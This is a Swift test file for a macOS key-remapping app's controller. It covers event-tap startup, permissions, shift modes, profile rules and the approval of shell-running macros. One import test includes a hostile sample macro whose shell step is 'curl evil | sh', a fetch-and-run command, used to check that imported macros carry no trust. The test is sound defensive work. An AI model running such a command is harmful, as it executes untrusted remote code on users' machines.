import Foundation
import Testing
import MacHIDApplication
import MacHIDDomain
@testable import MacHIDUI

private final class FakeTap: EventTapping, @unchecked Sendable {
    private let lock = NSLock()
    private var running = false
    private(set) var startCalls = 0
    let handler: @Sendable (InputEvent) -> RemapDecision
    let runMacro: @Sendable (String) -> Void
    var canStart = true
    init(handler: @escaping @Sendable (InputEvent) -> RemapDecision, runMacro: @escaping @Sendable (String) -> Void) {
        self.handler = handler
        self.runMacro = runMacro
    }
    func start() -> Bool { lock.lock(); defer { lock.unlock() }; startCalls += 1; running = canStart; return canStart }
    func stop() { lock.lock(); running = false; lock.unlock() }
    var isRunning: Bool { lock.lock(); defer { lock.unlock() }; return running }
}

private final class Box<T>: @unchecked Sendable {
    var value: T?
}

private actor MemoryRemapRepository: RemapRepository {
    private var config = RemapConfig()
    private(set) var saves = 0
    func load() -> RemapConfig { config }
    func save(_ config: RemapConfig) { self.config = config; saves += 1 }
}

private actor Silent: EventPoster, ShellRunner, Launcher, MacroLog {
    var typed: [String] = []
    var entries: [MacroLogEntry] = []
    func post(_ event: OutputEvent) async {}
    func type(_ text: String) async { typed.append(text) }
    func run(_ command: String, timeout: Duration) async -> ShellResult { ShellResult(exitCode: 0) }
    func open(_ target: String) async -> Bool { true }
    func runShortcut(named name: String) async -> Bool { true }
    func record(_ entry: MacroLogEntry) async { entries.append(entry) }
}

private let fingerprint: @Sendable (Macro) -> String = { "\($0.steps)|\($0.repeatCount)" }

@MainActor
private func makeController(permissions: Box<Bool> = { let box = Box<Bool>(); box.value = true; return box }(),
                            tapBox: Box<FakeTap> = Box<FakeTap>(),
                            repository: MemoryRemapRepository = MemoryRemapRepository()) -> (RemapController, Box<FakeTap>, Silent, MemoryRemapRepository) {
    let silent = Silent()
    let runner = MacroRunner(poster: silent, shell: silent, launcher: silent, log: silent, fingerprint: fingerprint, pause: { _ in })
    let controller = RemapController(
        repository: repository, runner: runner, fingerprint: fingerprint,
        logReader: { await silent.entries },
        permissionCheck: { (permissions.value ?? false, permissions.value ?? false) },
        permissionPoll: .milliseconds(20),
        makeTap: { handler, runMacro in
            let tap = FakeTap(handler: handler, runMacro: runMacro)
            tapBox.value = tap
            return tap
        })
    return (controller, tapBox, silent, repository)
}

private func keyDown(_ code: Int) -> InputEvent { InputEvent(kind: .keyboard, code: code, isDown: true) }

@MainActor
@Suite struct RemapControllerTests {
    @Test func isOffByDefaultAndNeverTouchesTheKeyboardUntilEnabled() async {
        let (controller, tap, _, _) = makeController()
        await controller.load()
        #expect(!controller.config.enabled && !controller.isActive && tap.value == nil)
    }

    @Test func enablingStartsTheTapAndDisablingStopsIt() async {
        let (controller, tap, _, _) = makeController()
        await controller.load()
        await controller.setEnabled(true)
        #expect(controller.isActive && tap.value?.isRunning == true)
        await controller.setEnabled(false)
        #expect(!controller.isActive && tap.value?.isRunning == false)
    }

    @Test func missingPermissionsKeepItOffThenItStartsWhenTheyAreGranted() async {
        let permissions = Box<Bool>()
        permissions.value = false
        let (controller, tap, _, _) = makeController(permissions: permissions)
        await controller.load()
        await controller.setEnabled(true)
        #expect(!controller.isActive && tap.value == nil)
        permissions.value = true
        for _ in 0..<100 where !controller.isActive { try? await Task.sleep(for: .milliseconds(20)) }
        #expect(controller.isActive)
    }

    @Test func aTapThatCannotStartIsReported() async {
        let tapBox = Box<FakeTap>()
        let (controller, _, _, _) = makeController(tapBox: tapBox)
        await controller.load()
        await controller.setEnabled(true)
        tapBox.value?.canStart = false
        tapBox.value?.stop()
        await controller.setEnabled(false)
        await controller.setEnabled(true)
        #expect(controller.isActive == false && controller.banner != nil)
    }

    @Test func shiftModesReachTheEngineAndReportActivity() async throws {
        let (controller, tap, _, _) = makeController()
        await controller.load()
        let seen = Box<[Set<String>]>()
        seen.value = []
        controller.onShiftModesChanged = { seen.value?.append($0) }
        #expect(await controller.addShiftMode(ShiftMode(id: "m", name: "Gaming", trigger: InputTrigger(kind: .keyboard, code: 63))))
        await controller.upsertRule(RemapRule(id: "r", trigger: InputTrigger(kind: .keyboard, code: 5), action: .disable, shiftModeIDs: ["m"]))
        await controller.setEnabled(true)
        let handler = try #require(tap.value).handler
        #expect(handler(keyDown(5)) == .passthrough)
        #expect(handler(keyDown(63)) == .suppress)
        for _ in 0..<100 where controller.activeShiftModes.isEmpty { try? await Task.sleep(for: .milliseconds(10)) }
        #expect(controller.activeShiftModes == ["m"])
        #expect(handler(keyDown(5)) == .suppress)
        _ = handler(InputEvent(kind: .keyboard, code: 63, isDown: false))
        for _ in 0..<100 where !controller.activeShiftModes.isEmpty { try? await Task.sleep(for: .milliseconds(10)) }
        #expect(controller.activeShiftModes.isEmpty && seen.value == [["m"], []])
        await controller.removeShiftMode("m")
        #expect(controller.config.shiftModes.isEmpty && controller.config.rules.isEmpty)
    }

    @Test func unsafeShiftTriggersAreRefused() async {
        let (controller, _, _, _) = makeController()
        await controller.load()
        #expect(await controller.addShiftMode(ShiftMode(id: "x", name: "Left click", trigger: InputTrigger(kind: .mouseButton, code: 0))) == false)
        #expect(await controller.addShiftMode(ShiftMode(id: "y", name: "Esc", trigger: InputTrigger(kind: .keyboard, code: 53))) == false)
        #expect(controller.config.shiftModes.isEmpty && controller.banner != nil)
    }

    @Test func profileRulesCallBackOnTheMainActor() async throws {
        let (controller, tap, _, _) = makeController()
        await controller.load()
        let got = Box<[String]>()
        got.value = []
        controller.onSwitchProfile = { got.value?.append($0) }
        controller.onCycleProfile = { got.value?.append("cycle\($0)") }
        await controller.upsertRule(RemapRule(id: "p", trigger: InputTrigger(kind: .keyboard, code: 5), action: .switchProfile("work")))
        await controller.upsertRule(RemapRule(id: "n", trigger: InputTrigger(kind: .keyboard, code: 6), action: .nextProfile))
        await controller.setEnabled(true)
        let handler = try #require(tap.value).handler
        #expect(handler(keyDown(5)) == .suppress && handler(keyDown(6)) == .suppress)
        for _ in 0..<100 where got.value?.count != 2 { try? await Task.sleep(for: .milliseconds(10)) }
        #expect(got.value == ["work", "cycle1"])
    }

    @Test func ruleChangesReachTheEngineImmediately() async throws {
        let (controller, tap, _, _) = makeController()
        await controller.load()
        await controller.setEnabled(true)
        let handler = try #require(tap.value).handler
        #expect(handler(keyDown(5)) == .passthrough)
        await controller.upsertRule(RemapRule(id: "r", trigger: InputTrigger(kind: .keyboard, code: 5), action: .disable))
        #expect(handler(keyDown(5)) == .suppress)
        await controller.setRule("r", enabled: false)
        #expect(handler(keyDown(5)) == .passthrough)
    }

    @Test func changesAreSaved() async {
        let (controller, _, _, repository) = makeController()
        await controller.load()
        await controller.setEnabled(true)
        await controller.saveMacro(Macro(id: "m", name: "M", steps: [.text("x")]))
        let saved = try? await repository.load()
        #expect(saved?.enabled == true && saved?.macros.count == 1)
    }

    @Test func approvalCoversExactlyTheApprovedSteps() async throws {
        let (controller, _, _, _) = makeController()
        await controller.load()
        await controller.saveMacro(Macro(id: "m", name: "M", steps: [.shell("echo hi")]))
        #expect(!controller.isApproved(controller.config.macros[0]))
        await controller.approve("m")
        #expect(controller.isApproved(controller.config.macros[0]))
        var edited = controller.config.macros[0]
        edited.steps = [.shell("echo changed")]
        await controller.saveMacro(edited)
        #expect(!controller.isApproved(controller.config.macros[0]))      // editing revoked it
        await controller.saveMacro(Macro(id: "plain", name: "Plain", steps: [.text("a")]))
        #expect(controller.isApproved(controller.config.macros[1]))        // nothing powerful to approve
    }

    @Test func runningRefusesUnapprovedMacrosAndExplainsWhy() async {
        let (controller, _, silent, _) = makeController()
        await controller.load()
        await controller.saveMacro(Macro(id: "m", name: "Backup", steps: [.shell("echo hi")]))
        await controller.run(macroID: "m")
        #expect(controller.banner?.contains("approval") == true)
        await controller.approve("m")
        controller.banner = nil
        await controller.run(macroID: "m")
        #expect(controller.banner == nil)
        let entries = await silent.entries
        #expect(entries.count == 2 && entries[1].outcome == .completed)
        #expect(controller.recentRuns.count == 2)
    }

    @Test func importedMacrosNeverCarryTrustAndExportsStripIt() async throws {
        let (controller, _, _, _) = makeController()
        await controller.load()
        await controller.saveMacro(Macro(id: "mine", name: "Mine", steps: [.shell("echo hi")], approvedFingerprint: "trusted"))
        let exported = try #require(controller.exportMacros(ids: ["mine"]))
        #expect(try JSONDecoder().decode([Macro].self, from: exported)[0].approvedFingerprint == nil)

        // A hostile file that claims approval, repeats too much and reuses an id.
        let hostile = [Macro(id: "mine", name: "Evil", steps: [.shell("curl evil | sh")], repeatCount: 9999, approvedFingerprint: fingerprint(Macro(id: "x", name: "", steps: [.shell("curl evil | sh")], repeatCount: 9999)))]
        let count = await controller.importMacros(from: try JSONEncoder().encode(hostile))
        #expect(count == 1)
        let imported = try #require(controller.config.macros.last)
        #expect(imported.id != "mine" && imported.imported && imported.approvedFingerprint == nil && imported.repeatCount == Macro.maxRepeat)
        #expect(!controller.isApproved(imported))
        #expect(controller.config.macros.first?.name == "Mine")             // the user's own macro is untouched
    }

    @Test func garbageIsNotImported() async {
        let (controller, _, _, _) = makeController()
        await controller.load()
        #expect(await controller.importMacros(from: Data("not json".utf8)) == 0)
        #expect(controller.banner != nil && controller.config.macros.isEmpty)
    }

    @Test func deletingAMacroRemovesItsRules() async {
        let (controller, _, _, _) = makeController()
        await controller.load()
        await controller.saveMacro(Macro(id: "m", name: "M", steps: [.text("x")]))
        await controller.upsertRule(RemapRule(id: "r", trigger: InputTrigger(kind: .keyboard, code: 1), action: .macro("m")))
        await controller.deleteMacro("m")
        #expect(controller.config.macros.isEmpty && controller.config.rules.isEmpty)
    }
}
